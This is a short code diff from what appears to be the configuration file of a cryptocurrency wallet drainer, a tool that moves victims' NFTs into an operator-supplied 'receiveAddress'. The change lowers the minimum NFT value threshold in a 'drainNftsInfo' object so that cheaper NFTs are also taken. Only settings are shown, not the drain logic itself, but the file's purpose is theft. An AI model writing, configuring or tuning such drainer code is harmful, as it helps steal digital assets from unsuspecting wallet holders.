@@ -4,7 +4,7 @@ const receiveAddress = "Put address here"; // YOUR WALLET ADDRESS
 
 
 const drainNftsInfo = {
-    minValue: 0.001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.00001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
     maxTransfers: 1000,
 }
 
